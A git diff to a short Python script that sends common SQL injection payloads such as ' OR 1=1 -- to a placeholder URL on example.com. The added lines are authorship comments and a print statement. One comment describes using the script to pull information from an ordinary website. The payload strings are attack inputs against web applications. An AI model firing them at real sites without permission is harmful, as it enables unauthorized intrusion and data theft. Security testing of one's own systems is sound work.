@@ -1,6 +1,7 @@
 import requests
-
+# Don't copy this script. This script is developed by Tawfique Elahey
 # List of common SQL injection payloads
+# This is a basic sql that can help users to find basic information of a normal website.
 sql_injection_payloads = [
     "' OR 1=1 --", 
     "' OR 'a'='a", 
@@ -33,3 +34,4 @@ def test_sql_injection(url):
 # Test the function
 url_to_test = 'http://example.com/vulnerable_page'
 test_sql_injection(url_to_test)
+print("This script is developed by Md Tawfique Elahey")"
